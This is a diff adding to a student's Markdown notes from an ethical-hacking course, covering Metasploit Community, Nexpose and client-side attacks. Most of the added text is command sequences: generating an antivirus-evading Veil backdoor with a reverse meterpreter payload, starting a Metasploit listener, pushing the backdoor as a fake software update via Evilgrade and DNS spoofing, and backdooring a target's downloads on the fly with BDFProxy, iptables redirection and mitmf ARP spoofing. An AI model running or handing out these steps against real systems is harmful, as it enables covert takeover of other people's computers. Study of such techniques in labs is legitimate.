@@ -374,6 +374,10 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
 * use the same way as before
 * Check if Kali machine is only connected with one interface (disconnect ethernet interface)
 
+## Using BETTERCAP to do the above more easily
+
+=> see lecture
+
 ## Wireshark and use with mitmf
 
 * Wireshark is a network protocol analyser
@@ -452,4 +456,103 @@ NOTE 2: If networks don't show up but interface is detected, try to put USB mode
 
 ### Exploit Code Execution Vulnerabilities
 
+* Same as before, you have to specify payload
 
+### Use Metasploit Community for ease of use
+
+* GUI that discover open ports and installed services (such as zenmap) and maps these services to metasploit modules and exploits and allow us to run these modules from the web GUI
+
+### Use Nexpose as an alternative
+
+* Vulnerability management framework that allows us to discover, assess, and act on discovered vulnerabilities.
+* Differencies are metasploit only show exploits that can be used within metasploit where nexpose works on a larger scale + nexpose writes a report at the end
+* Steps to be done to use Nexpose
+
+                systemctl nexposeconsole.service disable
+                service postgresql stop
+                cd /opt/rapid7/nexpose/nsc
+                ./nsc.sh
+
+# Client Side Attacks
+
+* Use if server side attacks fails
+* If IP is probably useless (different network, hidden behind a router, ...)
+* Require user interaction
+* Social engineering can be very useful
+* Information gathering is vital
+
+## Use Vell - to generate an undetectable (by antivirus) backdoor
+
+* Backdoor = file that gives us full control over the machine that it gets executed on
+* https://github.com/Veil-Framework/Veil
+* 2 tools:
+        * Evasion: tool that generates backdoor (primary tool) => use Evasion
+        * Ordnance: tool that generates payload (secondary tool)
+* Different type of payload
+        * meterpreter: allow to migrate between system process so we can have the payload/backdoor running from a normal process like Explorer => very hard to detect and does not leave a lot of footprints
+        * reverse connection: allows to bypass firewall by asking the target computer to connect to the attacker computer
+
+### Generating an undetectable backdoor
+
+        ./Veil.py
+        update
+        use Evasion
+        use 15
+        set LHOST <attacker IP>
+        set LPORT 8080
+        set PROCESSORS 1 => to bypass antivirus more thoroughly
+        set SLEEP 6 => idem
+        generate
+
+* Check if backdoor is detected by antivirus => https://nodistribute.com
+
+### Open port on attacker for reverse payload to work
+
+* We use metasploit to listen to incoming connection (same people coded metasploit and Veil)
+        
+        msfconsole
+        use exploit/multi/handler => module that listen to connection
+        show options
+        set payload windows/meterpreter/reverse_https => should correspond with the payload used in the backdoor
+        set LHOST 10.0.2.15
+        set LPORT 8080
+        exploit
+
+### Deliver the backdoor
+
+* Basic method: put the backdoor on a server and download it in the target computer (not effective, only for test)
+        * Put file from /var/lib/veil/output/compiled in /var/www/html/custom_folder
+        * Start service with service apache2 start
+* Using a fake update - Require DNS spoofing + Evilgrade (a server to serve the update)
+
+                //Download and install Evilgrade to have a server for the backdoor
+                ./evilgrade => start Evilgrade
+                show modules
+                configure dap => Download Accelerator Plus
+                set agent /var/www/html/payload.exe => set backdoor location
+                set endsite www.speedbit.com
+                start => start server
+
+                //Start dns spoofing
+                Use bettercap method for ease of use
+                
+                //Start handler
+                See above
+
+* Backdooring downloads on the fly via BDFPROXY- backdoor any exe that the target downloads
+
+                //Set IP addres in config
+                Install bdfproxy
+                leafpad /etc/bdfproxy/bdfproxy.cfg
+                bdfproxy => start program
+                
+                //Rediret traffic to bdfproxy
+                iptables -t nat -A PREROUTING -p tcp --destination-port 80 REDIRECT --to-port 8080
+
+                //Start listening for connections
+                msfconsole -r /usr/share/bdfproxy/bdf_proxy_msf_resource.rc
+
+                //Start arp spoofing
+                mitmf --arp --spoof-i <interface> --gateway <gateway IP> --targets <target IP>
+
+                // When done reset ip table rules
